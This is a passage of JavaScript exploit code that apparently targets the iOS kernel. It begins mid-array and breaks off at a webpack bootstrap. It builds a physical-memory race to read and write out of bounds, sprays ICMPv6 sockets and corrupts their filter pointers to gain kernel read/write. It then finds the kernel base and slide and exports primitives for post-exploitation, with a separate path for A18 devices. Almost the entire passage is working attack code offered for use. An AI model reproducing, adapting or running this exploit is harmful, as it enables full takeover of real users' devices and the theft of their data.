110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 86, 77, 95, 80, 82, 79, 84, 95, 68, 69, 70, 65, 85, 76, 84, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 86, 77, 95, 80, 82, 79, 84, 95, 68, 69, 70, 65, 85, 76, 84, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 86, 77, 95, 73, 78, 72, 69, 82, 73, 84, 95, 78, 79, 78, 69, 41, 59, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 105, 102, 32, 40, 107, 114, 32, 33, 61, 32, 75, 69, 82, 78, 95, 83, 85, 67, 67, 69, 83, 83, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 76, 79, 71, 40, 34, 91, 45, 93, 32, 109, 97, 99, 104, 95, 118, 109, 95, 109, 97, 112, 32, 102, 97, 105, 108, 101, 100, 32, 33, 33, 33, 34, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 76, 79, 71, 40, 34, 91, 43, 93, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 58, 32, 34, 32, 43, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 46, 104, 101, 120, 40, 41, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 76, 79, 71, 40, 34, 91, 43, 93, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 58, 32, 34, 32, 43, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 46, 104, 101, 120, 40, 41, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 101, 120, 105, 116, 40, 48, 110, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 114, 97, 99, 101, 95, 115, 121, 110, 99, 95, 112, 116, 114, 44, 32, 48, 110, 41, 59, 10, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 47, 47, 32, 101, 110, 97, 98, 108, 101, 95, 103, 99, 40, 41, 59, 10, 125, 10, 10, 102, 114, 101, 101, 95, 116, 104, 114, 101, 97, 100, 40, 41, 59, 0]);
    let free_thread_js = 0n;
    if (free_thread_js == 0n) {
      free_thread_js = free_thread_js_data;
    }
    free_thread_jsthread = js_thread_spawn(free_thread_js, free_thread_arg);
  }
  let default_file_content = calloc(1n, target_file_size);
  memset_pattern8(default_file_content, get_bigint_addr(random_marker), target_file_size);
  function create_target_file(path) {
    let fd = fopen(path, get_cstring("w"));
    let written = fwrite(default_file_content, 1n, target_file_size, fd);
    fclose(fd);
  }
  function create_physically_contiguous_mapping(port, address, size) {
    let dict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0n, kCFTypeDictionaryKeyCallBacks, kCFTypeDictionaryValueCallBacks);
    let cf_number = CFNumberCreate(kCFAllocatorDefault, 9n, get_bigint_addr(size));
    res = CFDictionarySetValue(dict, kIOSurfaceAllocSize, cf_number);
    let cfstring = create_cfstring(get_cstring("PurpleGfxMem"));
    res = CFDictionarySetValue(dict, create_cfstring(get_cstring("IOSurfaceMemoryRegion")), cfstring);
    let surface = IOSurfaceCreate(dict);
    CFRelease(dict);
    if (surface == 0n) {
      LOG("[-] Failed to create surface!!!");
      exit(0n);
    }
    let physical_mapping_address = IOSurfaceGetBaseAddress(surface);
    LOG("[+] physical_mapping_address: " + physical_mapping_address.hex());
    let memory_object = new_bigint();
    let kr = mach_make_memory_entry_64(mach_task_self(), get_bigint_addr(size), physical_mapping_address, VM_PROT_DEFAULT, get_bigint_addr(memory_object), 0n);
    if (kr != KERN_SUCCESS) {
      LOG("[-] mach_make_memory_entry_64 failed!!!");
      exit(0n);
    }
    let new_mapping_address = new_bigint();
    kr = mach_vm_map(mach_task_self(), get_bigint_addr(new_mapping_address), size, 0n, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, memory_object, 0n, 0n, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) {
      LOG("[-] mach_vm_map failed!!!");
      exit(0n);
    }
    CFRelease(surface);
    uwrite64(port, memory_object);
    uwrite64(address, new_mapping_address);
  }
  function initialize_physical_read_write(contiguous_mapping_size) {
    pc_size = contiguous_mapping_size;
    create_physically_contiguous_mapping(get_bigint_addr(pc_object), get_bigint_addr(pc_address), pc_size);
    LOG("[+] pc_object: " + pc_object.hex());
    LOG("[+] pc_address: " + pc_address.hex());
    memset_pattern8(pc_address, get_bigint_addr(random_marker), pc_size);
    free_target = pc_address;
    free_target_size = pc_size;
    uwrite64(free_target_sync_ptr, free_target);
    uwrite64(free_target_size_sync_ptr, free_target_size);
    uwrite64(free_thread_start_ptr, 1n);
    uwrite64(go_sync_ptr, 1n);
  }
  let iov = calloc(1n, 0x10n);
  let highiest_success_idx = 0n;
  let success_read_count = 0n;
  function physical_oob_read_mo(mo, mo_offset, size, offset, buffer) {
    uwrite64(target_object_sync_ptr, mo);
    uwrite64(target_object_offset_sync_ptr, mo_offset);
    uwrite64(iov + 0x00n, pc_address + 0x3f00n);
    uwrite64(iov + 0x08n, offset + size);
    uwrite64(buffer, random_marker);
    uwrite64(pc_address + 0x3f00n + offset, random_marker);
    let read_race_succeeded = false;
    let w = 0n;
    for (let try_idx = 0n; try_idx < highiest_success_idx + 100n; try_idx++) {
      uwrite64(race_sync_ptr, 1n);
      w = pwritev(read_fd, iov, 1n, 0x3f00n);
      cmp8_wait_for_change(race_sync_ptr, 1);
      kr = mach_vm_map(mach_task_self(), get_bigint_addr(pc_address), pc_size, 0n, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pc_object, 0n, 0n, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
      if (kr != KERN_SUCCESS) {
        LOG("[-] mach_vm_map failed!!!");
        exit(0n);
      }
      if (w == 0xFFFFFFFFFFFFFFFFn) {
        let r = pread(read_fd, buffer, size, 0x3f00n + offset);
        let marker = uread64(buffer);
        if (marker != random_marker) {
          read_race_succeeded = true;
          success_read_count += 0x1n;
          if (try_idx > highiest_success_idx) {
            highiest_success_idx = try_idx;
          }
          break;
        } else {
          usleep(1n);
        }
      }
      if (try_idx == 500n) {
        break;
      }
    }
    uwrite64(target_object_sync_ptr, 0n);
    if (read_race_succeeded == false) {
      return 1n;
    }
    return KERN_SUCCESS;
  }
  function physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer) {
    while (true) {
      kr = physical_oob_read_mo(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
      if (kr == KERN_SUCCESS) {
        break;
      }
    }
  }
  function physical_oob_write_mo(mo, mo_offset, size, offset, buffer) {
    uwrite64(target_object_sync_ptr, mo);
    uwrite64(target_object_offset_sync_ptr, mo_offset);
    uwrite64(iov + 0x00n, pc_address + 0x3f00n);
    uwrite64(iov + 0x08n, offset + size);
    pwrite(write_fd, buffer, size, 0x3f00n + offset);
    for (let try_idx = 0n; try_idx < 20n; try_idx++) {
      uwrite64(race_sync_ptr, 1n);
      preadv(write_fd, iov, 1n, 0x3f00n);
      cmp8_wait_for_change(race_sync_ptr, 1);
      kr = mach_vm_map(mach_task_self(), get_bigint_addr(pc_address), pc_size, 0n, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pc_object, 0n, 0n, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
      if (kr != KERN_SUCCESS) {
        LOG("[-] mach_vm_map failed!!!");
        exit(0n);
      }
    }
    uwrite64(target_object_sync_ptr, 0n);
    return;
  }
  let control_socket = 0n;
  let rw_socket = 0n;
  let control_socket_pcb = 0n;
  let rw_socket_pcb = 0n;
  let EARLY_KRW_LENGTH = 0x20n;
  let control_data = calloc(1n, EARLY_KRW_LENGTH);
  function set_target_kaddr(where) {
    memset(control_data, 0n, EARLY_KRW_LENGTH);
    uwrite64(control_data, where);
    let res = setsockopt(control_socket, IPPROTO_ICMPV6, ICMP6_FILTER, control_data, EARLY_KRW_LENGTH);
    if (res != 0n) {
      LOG("[-] setsockopt failed!!!");
      exit(0n);
    }
  }
  function early_kread(where, read_buf, size) {
    if (size > EARLY_KRW_LENGTH) {
      LOG("[!] error: (size > EARLY_KRW_LENGTH)");
      exit(0n);
    }
    set_target_kaddr(where);
    let read_data_length = BigInt(size);
    res = getsockopt(rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, read_buf, get_bigint_addr(read_data_length));
    if (res != 0n) {
      LOG("[-] getsockopt failed!!!");
      exit(0n);
    }
  }
  function early_kread64(where) {
    let value = new_bigint();
    let res = early_kread(where, get_bigint_addr(value), 0x8n);
    return update_bigint(value);
  }
  function early_kwrite32bytes(where, write_buf) {
    set_target_kaddr(where);
    let res = setsockopt(rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, write_buf, EARLY_KRW_LENGTH);
    if (res != 0n) {
      LOG("[-] setsockopt failed!!!");
      exit(0n);
    }
  }
  let early_kwrite64_write_buf = calloc(1n, EARLY_KRW_LENGTH);
  function early_kwrite64(where, what) {
    early_kread(where, early_kwrite64_write_buf, EARLY_KRW_LENGTH);
    uwrite64(early_kwrite64_write_buf, what);
    early_kwrite32bytes(where, early_kwrite64_write_buf);
  }
  function kread_length(address, buffer, size) {
    let remaining = BigInt(size);
    let read_offset = 0n;
    let read_size = 0n;
    while (remaining != 0n) {
      if (remaining >= EARLY_KRW_LENGTH) {
        read_size = EARLY_KRW_LENGTH;
      } else {
        read_size = remaining % EARLY_KRW_LENGTH;
      }
      early_kread(address + read_offset, buffer + read_offset, read_size);
      remaining -= read_size;
      read_offset += read_size;
    }
  }
  let kwrite_length_buffer = calloc(1n, EARLY_KRW_LENGTH);
  function kwrite_length(dst, src, size) {
    let remaining = BigInt(size);
    let write_offset = 0n;
    let write_size = 0n;
    while (remaining != 0n) {
      if (remaining >= EARLY_KRW_LENGTH) {
        write_size = EARLY_KRW_LENGTH;
      } else {
        write_size = remaining % EARLY_KRW_LENGTH;
      }
      let kwrite_dst_addr = dst + write_offset;
      let kwrite_src_addr = src + write_offset;
      if (write_size != EARLY_KRW_LENGTH) {
        kread_length(kwrite_dst_addr, kwrite_length_buffer, EARLY_KRW_LENGTH);
      }
      memcpy(kwrite_length_buffer, kwrite_src_addr, write_size);
      early_kwrite32bytes(kwrite_dst_addr, kwrite_length_buffer);
      remaining -= write_size;
      write_offset += write_size;
    }
  }
  function kwrite_zone_element(dst, src, len) {
    let CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE = 0x20n;
    if (len < CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) {
      LOG("kwrite_zone_element supports only zone element size >= 0x20");
      return false;
    }
    let write_size = 0n;
    let write_offset = 0n;
    let remaining = BigInt(len);
    while (remaining != 0n) {
      write_size = remaining >= CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE ? CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE : remaining % CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE;
      let kwrite_dst_addr = dst + write_offset;
      let kwrite_src_addr = src + write_offset;
      if (write_size != CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) {
        let adjust = CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE - write_size;
        kwrite_dst_addr -= adjust;
        kwrite_src_addr -= adjust;
      }
      kwrite_length(kwrite_dst_addr, kwrite_src_addr, CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE);
      remaining -= write_size;
      write_offset += write_size;
    }
    return true;
  }
  function kdump(where, size, msg = "") {
    LOG(`[+] ----------- ${msg} ----------`);
    for (let i = 0n; i < size; i += 0x10n) {
      LOG(`[+] [${i.hex()}] ${(where + i).hex()}:\t${early_kread64(where + i).hex()} ${early_kread64(where + i + 8n).hex()}`);
    }
  }
  function krw_sockets_leak_forever() {
    let offset_pcb_socket = 0x40n;
    let offset_socket_so_count = 0x254n;
    let control_socket_addr = early_kread64(control_socket_pcb + offset_pcb_socket);
    let rw_socket_addr = early_kread64(rw_socket_pcb + offset_pcb_socket);
    if (control_socket_addr == 0n || rw_socket_addr == 0n) {
      LOG("[-] Couldn't find control_socket_addr || rw_socket_addr");
      exit(0n);
    }
    let control_socket_so_count = early_kread64(control_socket_addr + offset_socket_so_count);
    let rw_socket_so_count = early_kread64(rw_socket_addr + offset_socket_so_count);
    early_kwrite64(control_socket_addr + offset_socket_so_count, control_socket_so_count + 0x0000100100001001n);
    early_kwrite64(rw_socket_addr + offset_socket_so_count, rw_socket_so_count + 0x0000100100001001n);
    let icmp6filt_offset = 0x148n;
    early_kwrite64(rw_socket_pcb + icmp6filt_offset + 0x8n, 0n);
  }
  let socket_ports = [];
  let socket_pcb_ids = [];
  let socket_ports_count = 0n;
  let getsockopt_read_length = 32n;
  let getsockopt_read_data = calloc(1n, getsockopt_read_length);
  let socket_info = calloc(1n, 0x400n);
  function spray_socket(socket_ports, socket_pcb_ids) {
    let fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
    if (fd == 0xFFFFFFFFFFFFFFFFn) {
      LOG("[-] socket create failed!!!");
      return fd;
    }
    let output_socket_port = new_bigint();
    fileport_makeport(fd, get_bigint_addr(output_socket_port));
    close(fd);
    let r = syscall(336n, 6n, getpid(), 3n, output_socket_port, socket_info, 0x400n);
    let inp_gencnt = uread64(socket_info + 0x110n);
    socket_ports.push(output_socket_port);
    socket_pcb_ids.push(inp_gencnt);
    return output_socket_port;
  }
  function sockets_release() {
    for (let sock_idx = 0n; sock_idx < socket_ports_count; sock_idx++) {
      let port = socket_ports.pop();
      mach_port_deallocate(mach_task_self(), port);
      socket_pcb_ids.pop();
    }
    socket_ports_count = 0n;
  }
  function create_surface_with_address(address, size) {
    let properties = CFDictionaryCreateMutable(kCFAllocatorDefault, 0n, kCFTypeDictionaryKeyCallBacks, kCFTypeDictionaryValueCallBacks);
    let address_ptr = new_uint64_t(address);
    let address_number = CFNumberCreate(kCFAllocatorDefault, 11n, address_ptr);
    CFDictionarySetValue(properties, create_cfstring(get_cstring("IOSurfaceAddress")), address_number);
    let size_ptr = new_uint64_t(size);
    let size_number = CFNumberCreate(kCFAllocatorDefault, 9n, size_ptr);
    CFDictionarySetValue(properties, create_cfstring(get_cstring("IOSurfaceAllocSize")), size_number);
    let surface = IOSurfaceCreate(properties);
    IOSurfacePrefetchPages(surface);
    free(address_ptr);
    free(size_ptr);
    CFRelease(address_number);
    CFRelease(size_number);
    CFRelease(properties);
    return surface;
  }
  let mlock_dict = {};
  function surface_mlock(address, size) {
    let surf = create_surface_with_address(address, size);
    mlock_dict[address] = surf;
  }
  function surface_munlock(address, size) {
    if (mlock_dict[address] != undefined) {
      CFRelease(mlock_dict[address]);
    }
    mlock_dict[address] = undefined;
  }
  function find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, do_read = true) {
    if (do_read == true) {
      physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
    }
    let search_start_idx = 0n;
    let target_found = false;
    let pcb_start_offset = 0n;
    let icmp6filt_offset = 0x148n;
    let found = 0n;
    do {
      found = memmem(read_buffer + search_start_idx, oob_size - search_start_idx, executable_name, strlen(executable_name));
      if (found != 0n) {
        pcb_start_offset = found - read_buffer & 0xFFFFFFFFFFFFFC00n;
        if (uread64(read_buffer + pcb_start_offset + icmp6filt_offset + 0x8n) == 0x0000ffffffffffffn) {
          target_found = true;
          break;
        }
      }
      search_start_idx += 0x400n;
    } while (found != 0n && search_start_idx < oob_size);
    if (target_found == true) {
      LOG("[+] pcb_start_offset: " + pcb_start_offset.hex());
      let target_inp_gencnt = uread64(read_buffer + pcb_start_offset + 0x78n);
      LOG("[+] target_inp_gencnt: " + target_inp_gencnt.hex());
      if (target_inp_gencnt == socket_pcb_ids[socket_ports_count - 1n]) {
        LOG(`[-] Found last PCB`);
        return -1n;
      }
      let is_our_pcb = false;
      let control_socket_idx = undefined;
      for (let sock_idx = 0n; sock_idx < socket_ports_count; sock_idx++) {
        if (socket_pcb_ids[sock_idx] == target_inp_gencnt) {
          is_our_pcb = true;
          control_socket_idx = sock_idx;
          break;
        }
      }
      if (is_our_pcb == false) {
        LOG(`[-] Found freed PCB Page!`);
        return -1n;
      }
      if (target_inp_gencnt_list.includes(target_inp_gencnt)) {
        LOG(`[-] Found old PCB Page!!!!`);
        return -1n;
      } else {
        target_inp_gencnt_list.push(target_inp_gencnt);
      }
      let inp_list_next_pointer = uread64(read_buffer + pcb_start_offset + 0x28n) - 0x20n;
      let icmp6filter = uread64(read_buffer + pcb_start_offset + icmp6filt_offset);
      LOG("[+] inp_list_next_pointer: " + inp_list_next_pointer.hex());
      LOG("[+] icmp6filter: " + icmp6filter.hex());
      rw_socket_pcb = BigInt(inp_list_next_pointer);
      memcpy(write_buffer, read_buffer, oob_size);
      uwrite64(write_buffer + pcb_start_offset + icmp6filt_offset, inp_list_next_pointer + icmp6filt_offset);
      uwrite64(write_buffer + pcb_start_offset + icmp6filt_offset + 0x8n, 0n);
      LOG("[+] Corrupting icmp6filter pointer...");
      while (true) {
        physical_oob_write_mo(memory_object, seeking_offset, oob_size, oob_offset, write_buffer);
        physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
        let new_icmp6filter = uread64(read_buffer + pcb_start_offset + icmp6filt_offset);
        if (new_icmp6filter == inp_list_next_pointer + icmp6filt_offset) {
          LOG("[+] target corrupted: " + uread64(read_buffer + pcb_start_offset + icmp6filt_offset).hex());
          break;
        }
      }
      let sock = fileport_makefd(socket_ports[control_socket_idx]);
      let res = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, getsockopt_read_data, get_bigint_addr(getsockopt_read_length));
      if (res != 0n) {
        LOG("[-] getsockopt failed!!!");
        exit(0n);
      }
      let marker = uread64(getsockopt_read_data);
      if (marker != 0xffffffffffffffffn) {
        LOG("[+] Found control_socket at idx: " + control_socket_idx.hex());
        control_socket = sock;
        rw_socket = fileport_makefd(socket_ports[control_socket_idx + 0x1n]);
        return KERN_SUCCESS;
      } else {
        LOG("[-] Failed to corrupt control_socket at idx: " + control_socket_idx.hex());
      }
    }
    return -1n;
  }
  let kernel_base = 0n;
  let kernel_slide = 0n;
  let is_a18_devices = false;
  function pe_v1() {
    let n_of_total_search_mapping_pages = 0x1000n * 0x10n;
    if (is_a18_devices) {
      n_of_total_search_mapping_pages = 0x10n * 0x10n;
    }
    let search_mapping_size = 0x2000n * PAGE_SIZE;
    if (is_a18_devices) {
      search_mapping_size = 0x10n * PAGE_SIZE;
    }
    let total_search_mapping_size = n_of_total_search_mapping_pages * PAGE_SIZE;
    let n_of_search_mappings = total_search_mapping_size / search_mapping_size;
    let read_buffer = calloc(1n, oob_size);
    let write_buffer = calloc(1n, oob_size);
    initialize_physical_read_write(n_of_oob_pages * PAGE_SIZE);
    let wired_mapping = new_bigint();
    let wired_mapping_size = 1024n * 1024n * 1024n * 3n;
    if (is_a18_devices) {
      kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(wired_mapping), wired_mapping_size, VM_FLAGS_ANYWHERE);
      LOG(`[+] wired_mapping: ${wired_mapping.hex()}`);
    }
    let target_inp_gencnt_list = [];
    while (true) {
      if (is_a18_devices) {
        surface_mlock(wired_mapping, wired_mapping_size);
        for (let s = 0n; s < wired_mapping_size / 0x4000n; s++) {
          uwrite64(wired_mapping + s * 0x4000n, 0n);
        }
      }
      let search_mappings = [];
      for (let s = 0n; s < n_of_search_mappings; s++) {
        let search_mapping_address = new_bigint();
        kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(search_mapping_address), search_mapping_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
        if (kr != KERN_SUCCESS) {
          LOG("[-] mach_vm_allocate failed!!!");
          exit(0n);
        }
        for (let k = 0n; k < search_mapping_size; k += PAGE_SIZE) {
          uwrite64(search_mapping_address + k, random_marker);
        }
        search_mappings.push(search_mapping_address);
      }
      socket_ports = [];
      socket_pcb_ids = [];
      socket_ports_count = 0n;
      const OPEN_MAX = 10240n;
      let maxfiles = 3n * OPEN_MAX;
      let leeway = 4096n * 2n;
      for (let socket_count = 0n; socket_count < maxfiles - leeway; socket_count++) {
        let port = spray_socket(socket_ports, socket_pcb_ids);
        if (port == 0xFFFFFFFFFFFFFFFFn) {
          LOG("[-] Failed to spray sockets: " + socket_ports_count.hex());
          break;
        } else {
          socket_ports_count++;
        }
      }
      let start_pcb_id = socket_pcb_ids[0];
      let end_pcb_id = socket_pcb_ids[socket_ports_count - 1n];
      LOG(`[i] socket_ports_count: ${socket_ports_count.hex()}`);
      LOG(`[i] start_pcb_id: ${start_pcb_id.hex()}`);
      LOG(`[i] end_pcb_id: ${end_pcb_id.hex()}`);
      let success = false;
      for (let s = 0n; s < n_of_search_mappings; s++) {
        let search_mapping_address = search_mappings[s];
        LOG("[i] looking in search mapping: " + s);
        let memory_object = new_bigint();
        let memory_object_size = BigInt(search_mapping_size);
        kr = mach_make_memory_entry_64(mach_task_self(), get_bigint_addr(memory_object_size), search_mapping_address, VM_PROT_DEFAULT, get_bigint_addr(memory_object), 0n);
        if (kr != 0n) {
          LOG("[-] mach_make_memory_entry_64 failed!!!");
          exit(0n);
        }
        surface_mlock(search_mapping_address, search_mapping_size);
        let seeking_offset = 0n;
        while (seeking_offset < search_mapping_size) {
          kr = physical_oob_read_mo(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
          if (kr == KERN_SUCCESS) {
            if (find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, false) == KERN_SUCCESS) {
              success = true;
              break;
            }
          }
          seeking_offset += PAGE_SIZE;
        }
        kr = mach_port_deallocate(mach_task_self(), memory_object);
        if (kr != KERN_SUCCESS) {
          LOG("[-] mach_port_deallocate failed!!!");
          exit(0n);
        }
        if (success == true) {
          break;
        }
      }
      sockets_release();
      for (let s = 0n; s < n_of_search_mappings; s++) {
        let search_mapping_address = search_mappings.pop();
        kr = mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
      }
      if (is_a18_devices) {
        surface_munlock(wired_mapping, wired_mapping_size);
      }
      if (success == true) {
        break;
      }
    }
  }
  function pe_v2() {
    let read_buffer = calloc(1n, oob_size);
    let write_buffer = calloc(1n, oob_size);
    initialize_physical_read_write(n_of_oob_pages * PAGE_SIZE);
    let getsockopt_read_length = 32n;
    let getsockopt_read_data = calloc(1n, getsockopt_read_length);
    let wired_mapping_entry_size = PAGE_SIZE;
    let wired_mapping_entries_total_size = 1024n * 1024n * 1024n * 2n;
    let n_of_wired_mapping_entries = wired_mapping_entries_total_size / wired_mapping_entry_size;
    let wired_mapping_entries_addresses = [];
    LOG("[i] Allocating memory");
    let kr = KERN_SUCCESS;
    let wired_address = 0n;
    for (let i = 0n; i < n_of_wired_mapping_entries; i++) {
      if (i == 0n) {
        wired_address = new_bigint();
        do {
          kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(wired_address), wired_mapping_entry_size, VM_FLAGS_ANYWHERE);
        } while (kr != KERN_SUCCESS);
      } else {
        wired_address = BigInt(wired_mapping_entries_addresses.slice(-1));
        do {
          wired_address += wired_mapping_entry_size;
          kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(wired_address), wired_mapping_entry_size, VM_FLAGS_FIXED);
        } while (kr != KERN_SUCCESS);
      }
      wired_mapping_entries_addresses.push(wired_address);
      surface_mlock(wired_address, wired_mapping_entry_size);
      uwrite64(wired_address, wired_page_marker);
      uwrite64(wired_address + 0x8n, wired_address);
    }
    let target_inp_gencnt_list = [];
    LOG("[i] Allocating memory done");
    while (true) {
      let search_mapping_size = 0x800n * PAGE_SIZE;
      let search_mapping_address = new_bigint();
      kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(search_mapping_address), search_mapping_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
      if (kr != KERN_SUCCESS) {
        LOG("[-] mach_vm_allocate failed!!!");
        exit(0n);
      }
      for (let k = 0n; k < search_mapping_size; k += PAGE_SIZE) {
        uwrite64(search_mapping_address + k, random_marker);
      }
      surface_mlock(search_mapping_address, search_mapping_size);
      let memory_object = new_bigint();
      let memory_object_size = BigInt(search_mapping_size);
      kr = mach_make_memory_entry_64(mach_task_self(), get_bigint_addr(memory_object_size), search_mapping_address, VM_PROT_DEFAULT, get_bigint_addr(memory_object), 0n);
      if (kr != 0n) {
        LOG("[-] mach_make_memory_entry_64 failed!!!");
        exit(0n);
      }
      socket_ports = [];
      socket_pcb_ids = [];
      socket_ports_count = 0n;
      let max_sockets_count = 0x5800n;
      let split_count = 8n;
      let wired_pages = [];
      let success = false;
      let seeking_offset = 0n;
      while (seeking_offset < search_mapping_size) {
        kr = physical_oob_read_mo(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
        if (kr != KERN_SUCCESS) {
          seeking_offset += PAGE_SIZE;
          continue;
        }
        if (uread64(read_buffer) == wired_page_marker) {
          let wired_page = uread64(read_buffer + 0x8n);
          LOG(`[i] seeking_offset: ${seeking_offset.hex()}: Found wired_page: ${wired_page.hex()}`);
          if (wired_pages.indexOf(wired_page) == -1) {
            wired_pages.push(wired_page);
            let idx = wired_mapping_entries_addresses.indexOf(wired_page);
            wired_mapping_entries_addresses.splice(idx, 1);
            uwrite64(wired_page, 0n);
            uwrite64(wired_page + 0x8n, 0n);
          } else {
            LOG(`[-] Found old wired page!!!!`);
            seeking_offset += PAGE_SIZE;
            continue;
          }
          kr = mach_vm_deallocate(mach_task_self(), wired_page, wired_mapping_entry_size);
          if (kr != KERN_SUCCESS) {
            LOG(`[-] Failed to deallocate wired page!!!!`);
          }
          for (let socket_count = 0n; socket_count < max_sockets_count / split_count; socket_count++) {
            let port = spray_socket(socket_ports, socket_pcb_ids);
            if (port == 0xFFFFFFFFFFFFFFFFn) {
              LOG("[-] Failed to spray sockets: " + socket_ports_count.hex());
              break;
            } else {
              socket_ports_count++;
            }
          }
          if (find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, true) == KERN_SUCCESS) {
            LOG(`[i] seeking_offset: ${seeking_offset.hex()}: Reallocated PCB page`);
            success = true;
            break;
          } else {
            if (socket_ports_count >= max_sockets_count) {
              sockets_release();
              LOG("[+] waiting for zone trimming...");
              sleep(20n);
            }
            seeking_offset = 0n;
          }
        } else if (find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, false) == KERN_SUCCESS) {
          LOG(`[i] seeking_offset: ${seeking_offset.hex()}: Found PCB page`);
          success = true;
          break;
        } else {
          seeking_offset += PAGE_SIZE;
        }
      }
      kr = mach_port_deallocate(mach_task_self(), memory_object);
      if (kr != KERN_SUCCESS) {
        LOG("[-] mach_port_deallocate failed!!!");
        exit(0n);
      }
      sockets_release();
      kr = mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
      if (success == true) {
        break;
      }
    }
    for (let i = 0n; i < BigInt(wired_mapping_entries_addresses.length); i++) {
      let wired_page = wired_mapping_entries_addresses[i];
      mach_vm_deallocate(mach_task_self(), wired_page, wired_mapping_entry_size);
    }
  }
  function pe() {
    let device_machine = get_device_machine();
    if (strstr(device_machine, get_cstring("iPhone17,")) != 0n) {
      LOG("[+] Running on A18 Devices");
      is_a18_devices = true;
      sleep(8n);
      pe_init();
      pe_v2();
    } else {
      LOG("[+] Running on non-A18 Devices");
      pe_init();
      pe_v1();
    }
    LOG(`[+] highiest_success_idx: ${highiest_success_idx}`);
    LOG(`[+] success_read_count: ${success_read_count}`);
    uwrite64(go_sync_ptr, 0n);
    uwrite64(race_sync_ptr, 1n);
    js_thread_join(free_thread_jsthread);
    close(write_fd);
    close(read_fd);
    control_socket_pcb = early_kread64(rw_socket_pcb + 0x20n);
    let pcbinfo_pointer = early_kread64(control_socket_pcb + 0x38n);
    let ipi_zone = early_kread64(pcbinfo_pointer + 0x68n);
    let zv_name = early_kread64(ipi_zone + 0x10n);
    kernel_base = zv_name & 0xFFFFFFFFFFFFC000n;
    while (true) {
      if (early_kread64(kernel_base) == 0x100000cfeedfacfn) {
        if (early_kread64(kernel_base + 0x8n) == 0xc00000002n) {
          break;
        }
      }
      kernel_base -= PAGE_SIZE;
    }
    kernel_slide = kernel_base - 0xfffffff007004000n;
    krw_sockets_leak_forever();
  }
  mpd_js_thread_spawn = js_thread_spawn;
  mpd_js_thread_join = js_thread_join;
  mpd_pe = pe;
  mpd_kread64 = early_kread64;
  mpd_kwrite64 = early_kwrite64;
  mpd_kwrite_length = kwrite_length;
  mpd_kread_length = kread_length;
  mpd_kwrite_zone_element = kwrite_zone_element;
  mpd_control_socket = function() { return control_socket; }
  mpd_rw_socket = function() { return rw_socket; }
  mpd_pacia_gadget = function() { return dyld_signPointer_gadget; }
  mpd_kernel_slide = function (addr = 0n) {
    return addr + kernel_slide;
  };
  mpd_kernel_base = function () {
    return kernel_base;
  };
  pe();
   
  LOG("[+] PE Post-Exploitation !!!");
  LOG(`[+] kernel_base: ${mpd_kernel_base().hex()}`);
  LOG(`[+] kernel_slide: ${mpd_kernel_slide().hex()}`);
  let main = {};
  main.chainData = {
  	  "chosenOffsets": null
  }
  
  try {
	  /******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
